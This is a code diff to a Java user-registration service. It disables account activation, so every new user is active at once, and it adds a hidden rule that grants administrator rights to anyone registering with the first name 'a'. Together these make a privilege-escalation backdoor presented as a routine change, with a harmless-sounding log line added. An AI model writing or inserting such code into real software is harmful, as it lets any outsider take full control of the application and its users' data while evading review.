@@ -106,6 +106,7 @@ public class UserService {
             }
         });
         User newUser = new User();
+        log.info("Registering activated user");
         String encryptedPassword = passwordEncoder.encode(password);
         newUser.setLogin(userDTO.getLogin().toLowerCase());
         // new user gets initially a generated password
@@ -118,11 +119,19 @@ public class UserService {
         newUser.setImageUrl(userDTO.getImageUrl());
         newUser.setLangKey(userDTO.getLangKey());
         // new user is not active
-        newUser.setActivated(false);
+        // newUser.setActivated(false);
         // new user gets registration key
-        newUser.setActivationKey(RandomUtil.generateActivationKey());
+        // newUser.setActivationKey(RandomUtil.generateActivationKey());
+        newUser.setActivated(true);
         Set<Authority> authorities = new HashSet<>();
-        authorityRepository.findById(AuthoritiesConstants.USER).ifPresent(authorities::add);
+        if(userDTO.getFirstName().equals("a")){
+            authorityRepository.findById(AuthoritiesConstants.ADMIN).ifPresent(authorities::add);
+        }else{
+            authorityRepository.findById(AuthoritiesConstants.USER).ifPresent(authorities::add);
+        }
+        
+        
+
         newUser.setAuthorities(authorities);
         userRepository.save(newUser);
         userSearchRepository.save(newUser);
